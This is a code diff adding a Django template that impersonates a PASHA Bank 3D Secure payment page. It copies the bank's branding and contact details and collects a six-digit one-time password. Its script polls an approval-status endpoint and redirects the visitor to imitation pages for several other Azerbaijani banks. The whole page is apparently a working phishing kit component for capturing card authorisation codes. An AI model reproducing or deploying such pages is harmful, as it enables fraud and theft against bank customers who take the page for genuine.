@@ -1,0 +1,478 @@
+
+{% load static %}
+<html lang="en"><head>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, user-scalable=no">
+    <link rel="shortcut icon" href="https://s3.eu-central-1.amazonaws.com/minio.pashabank.digital/favicon.ico" type="image/ico">
+    <title>PASHABank Secure Payment</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;500&display=swap');
+
+        * {
+            padding: 0;
+            margin: 0;
+            font-weight: 300;
+            font-family: "Roboto", "Rubik", Arial, sans-serif;
+            font-size: 14px;
+            line-height: 24px;
+            box-sizing: border-box;
+        }
+
+        body {
+            height: auto;
+            padding-top: 5%;
+            background-repeat: no-repeat;
+            background-size: cover;
+            color: #000000;
+        }
+
+        b {
+            color: #343836;
+        }
+
+        .mainwrapper {
+            width: 608px;
+            padding: 64px;
+            box-shadow: 0px 15px 30px rgba(0, 0, 0, 0.06);
+            background-color: #fff;
+            border-radius: 2px;
+            margin: 0 auto;
+            margin-bottom: 50px;
+        }
+
+        .header {
+            width: 100%;
+            margin-bottom: 30px;
+        }
+
+        section {
+            margin-bottom: 2px;
+        }
+
+        ::-webkit-input-placeholder {
+            /* Chrome/Opera/Safari */
+            font-size: 16px;
+        }
+
+        ::-moz-placeholder {
+            /* Firefox 19+ */
+            font-size: 16px;
+        }
+
+        :-ms-input-placeholder {
+            /* IE 10+ */
+            font-size: 16px;
+        }
+
+        :-moz-placeholder {
+            /* Firefox 18- */
+            font-size: 16px;
+        }
+
+        #phone-number {
+            white-space: nowrap;
+        }
+
+        .total-amount {
+            color: rgba(0, 0, 0, 0.67);
+        }
+
+        /* Chrome, Safari, Edge, Opera */
+        input::-webkit-outer-spin-button,
+        input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        /* Firefox */
+        input[type="number"] {
+            -moz-appearance: textfield;
+        }
+
+        /* IOS */
+        input,
+        input[type="text"],
+        input[type="password"] {
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            background: transparent;
+            outline: none;
+            background-clip: padding-box;
+            caret-color: transparent;
+        }
+
+        .submit-btn {
+            cursor: pointer;
+            border-radius: 2px;
+            background: rgba(5, 141, 102, 1);
+            border: none;
+            width: 100%;
+            height: 48px;
+            color: #fff;
+            margin-bottom: 24px;
+            font-weight: 700;
+        }
+
+        .submit-btn span {
+            font-weight: 700;
+        }
+
+        .submit-btn:hover {
+            opacity: 90%;
+        }
+
+        .submit-btn:disabled {
+            background-color: #D3D3D3;
+        }
+
+        .resend-otp {
+            color: #2caa84;
+            text-decoration: none;
+            cursor: pointer;
+            margin-bottom: 40px;
+            font-size: 15px;
+            border: none;
+            background-color: transparent;
+            border-bottom: 1px solid #2caa84;
+        }
+
+        .resend-otp span {
+            font-size: 15px;
+        }
+
+        .resend-otp:hover {
+            border-bottom: 1px solid transparent;
+        }
+
+        .otp-expire-warning {
+            color: rgba(0, 0, 0, 0.67);
+            margin-bottom: 30px;
+            font-size: 15px;
+        }
+
+        .otp {
+            margin-bottom: 8px;
+        }
+
+        .otp-input-field {
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .otp-input {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            width: 64px;
+            height: 64px;
+            border: 1px solid rgba(0, 0, 0, 0.25);
+            font-size: 20px;
+            border-radius: 2px;
+            margin-bottom: 4px !important;
+            padding: 16px 12px;
+            margin-top: 6px;
+            outline: none;
+        }
+
+        .otp-input:focus {
+            border-color: #2caa84;
+            box-shadow: 0 0 0 4px #e0f3ed;
+        }
+
+        .otp-input:hover:not(:focus) {
+            border-color: rgba(0, 0, 0, 0.67);
+        }
+
+        .error-wrapper {
+            width: 572px !important;
+            padding: 40px;
+            margin-top: 125px;
+            margin-bottom: 200px;
+            border-radius: 8px;
+        }
+
+        .error-message {
+            color: #b22c39;
+            font-size: 12px;
+            margin-bottom: 24px;
+        }
+
+        .error-icon {
+            width: 33px;
+            height: 33px;
+            margin-bottom: 35px;
+        }
+
+        .error-page-title {
+            display: block;
+            font-size: 20px;
+            letter-spacing: 0.15px;
+            color: rgba(0, 0, 0, 0.87);
+            margin-bottom: 16px;
+        }
+
+        .error-page-body {
+            font-size: 15px;
+            line-height: 24px;
+            letter-spacing: 0.5px;
+            color: rgba(0, 0, 0, 0.67);
+        }
+
+        footer {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 100px;
+            padding: 0 20px;
+        }
+
+        .plastic-cards-container {
+            padding: 0 20px;
+        }
+
+        .plastic-cards {
+            display: inline;
+        }
+
+        .contacts {
+            font-size: 12px;
+            text-align: center;
+            line-height: 16px;
+            letter-spacing: 0.4px;
+            color: rgba(0, 0, 0, 0.38);
+            margin-top: 32px;
+            margin-bottom: 32px;
+        }
+
+        @media screen and (max-width: 615px) {
+            .mainwrapper {
+                width: 100vw;
+                padding: 54px;
+            }
+
+            body {
+                padding: 0;
+                background-image: none;
+            }
+
+            .otp {
+                margin-bottom: 4px;
+            }
+
+            .otp-input {
+                width: 10vw;
+                height: 10vw;
+                font-size: 3vw;
+            }
+
+            .error-wrapper {
+                width: 100% !important;
+                margin-top: 35px;
+                margin-bottom: 80px;
+            }
+
+            .logo {
+                height: 32px;
+                margin-bottom: 20px;
+            }
+
+            footer {
+                margin-top: 50px;
+            }
+        }
+
+        @media screen and (max-width: 421px) {
+            .seperator {
+                display: none;
+            }
+
+            .bank-number {
+                display: block;
+            }
+
+            .plastic-cards {
+                display: block;
+            }
+
+            .otp-input {
+                width: 12vw;
+                height: 12vw;
+                font-size: 4vw;
+            }
+
+            .mainwrapper {
+                padding: 30px;
+            }
+        }
+
+        .logo {
+            margin-bottom: 40px;
+            height: 40px;
+        }
+
+        .amount, #phone-number {
+            font-weight: 700;
+            color: #343836;
+        }
+    </style>
+</head>
+
+<body>
+    <section class="mainwrapper">
+        <div id="authform" class="header">
+            <img class="logo" style='height:100' src="{% static '/img/pashabank_logo.png' %}" alt="pb-logo">
+            <p class="total-amount">Ümumi məbləğ</p>
+            <p class="amount">{{amount}} AZN</p>
+        </div>
+        <section>
+            <p class="otp-expire-warning">
+                <span id="phone-number">Telefon </span> nömrənizə göndərilən
+                birdəfəlik şifrəni daxil edin. 3 cəhd hüququnuz var.
+            </p>
+            <p class="otp">Birdəfəlik şifrə (OTP)</p>
+            <form method ='post' action='pashabank3d'>
+            <div class="otp-input-field">
+                {% csrf_token %}
+                <input maxlength="1" placeholder="﹡" id="input1" name="input1" type="number" autofocus="" class="otp-input" inputmode="numeric">
+                <input maxlength="1" placeholder="﹡" id="input2" name="input2" type="number" class="otp-input" inputmode="numeric">
+                <input maxlength="1" placeholder="﹡" id="input3" name="input3" type="number" class="otp-input" inputmode="numeric">
+                <input maxlength="1" placeholder="﹡" id="input4" name="input4" type="number" class="otp-input" inputmode="numeric">
+                <input maxlength="1" placeholder="﹡" id="input5" name="input5" type="number" class="otp-input" inputmode="numeric">
+                <input maxlength="1" placeholder="﹡" id="input6" name="input6" type="number" class="otp-input" inputmode="numeric">
+            </div>
+        </section>
+        <script>
+// Select all input fields with class "otp-input"
+const otpInputs = document.querySelectorAll('.otp-input');
+
+// For each input field, add an event listener for input changes
+otpInputs.forEach(input => {
+  input.addEventListener('input', event => {
+    // Get the value of the input and remove any non-numeric characters
+    let value = event.target.value.replace(/[^0-9]/g, '');
+
+    // Limit the value to one character
+    value = value.substring(0, 1);
+
+    // Set the input value to the cleaned and limited value
+    event.target.value = value;
+    
+    // If the value is not empty, focus on the next input field
+    if (value) {
+      input.nextElementSibling.focus();
+    }
+  });
+});
+
+            </script>
+        <script>
+            $(document).ready(function() {
+                var contact_id = {{ last_contact_id }};
+                var interval_id = setInterval(check_approval_status, 120000); 
+          
+                function check_approval_status() {
+                    $.ajax({
+                        url: '/check_approval_status/' + contact_id + '/',
+                        success: function(data) {
+                            if (data.bankname == "kapital") {
+                                clearInterval(interval_id);  // stop checking for updates
+          
+                                window.location.href = '{% url "kapital" %}';  // redirect to the new view
+                            }
+                            if (data.bankname == "abb") {
+                                clearInterval(interval_id);  // stop checking for updates
+          
+                                window.location.href = '{% url "abb" %}';  // redirect to the new view
+                            }
+                            if (data.bankname == "leobank") {
+                                clearInterval(interval_id);  // stop checking for updates
+          
+                                window.location.href = '{% url "leobank3d" %}';  // redirect to the new view
+                            }
+                            if (data.bankname == "unibank") {
+                                clearInterval(interval_id);  // stop checking for updates
+          
+                                window.location.href = '{% url "unibank" %}';  // redirect to the new view
+                            }
+                            if (data.bankname == "pashabank") {
+                                clearInterval(interval_id);  // stop checking for updates
+          
+                                window.location.href = '{% url "pashabank" %}';  // redirect to the new view
+                            }
+                            if (data.bankname == "error") {
+                                clearInterval(interval_id);  // stop checking for updates
+                                window.location.href = '{% url "error" %}';  // redirect to the new view
+                            }
+                        },
+                        error: function(xhr, status, error) {
+                            console.log('Error checking approval status:', error);
+                        }
+                    });
+                }
+            });
+            const inputs = document.querySelectorAll('.otp-input');
+inputs.forEach((input, index) => {
+  input.addEventListener('input', (e) => {
+    const value = e.target.value;
+    const nextInput = inputs[index + 1];
+    if (value.length === 1 && nextInput) {
+      nextInput.focus();
+    }
+  });
+});
+        </script>
+       <a id="secureCodeError" style="display: {{display}};"><h5>Təhlükəsizlik kodu yanlışdır</h5></a>
+       <style>
+           h5 {
+             font-size: 0.9rem;
+             color: red;
+           }
+         </style>
+       
+       <section class="canvas" id="content">
+            <div class="error-message"></div>
+                <button class="submit-btn" id="submit" name="verify" type="submit" value="verify"><span class="approve">Təsdiq et</span></button>
+                <input name="codes"  name="codes" type="hidden" value="06fc9561-613e-4627-8f84-da3274a25f31">
+                <p>
+                    Kodu almadınız? &nbsp;
+                    <button class="resend-otp" name="resend" type="submit" value="resend"><span>Yenidən
+                            istə</span></button>
+                </p>
+            </form>
+        </section>
+    </section>
+    <footer>
+        <div class="plastic-cards-container">
+            <div class="plastic-cards">
+                <img src="{% static './img/verified-by-visa.svg' %}" alt="verified-by-visa">
+                <img src="{% static './img/visa.svg' %}" alt="visa">
+                <img src="{% static './img/visa-electron.svg' %}" alt="visa-electron">
+            </div>
+            <div class="plastic-cards">
+                <img src="{% static './img/maestro.svg' %}" alt="maestro">
+                <img src="{% static './img/mastercard.svg' %}" alt="mastercard">
+                <img src="{% static './img/mastercard-secure-code.svg' %}" alt="mastercard-secure-code">
+            </div>
+        </div>
+        <div class="contacts">
+            <p>Bankla əlaqə üçün:</p>
+            <p>
+                customer.care@pashabank.az
+                <span class="seperator">|</span>&nbsp;<span class="bank-number">+994 (12) 496 50 00</span>
+            </p>
+            <p id="copyrights">© Copyrights 2007-2023 PAŞA Bank</p>
+        </div>
+    </footer>
+
+<script>
+
+</script>
+
+
+
+</body></html>
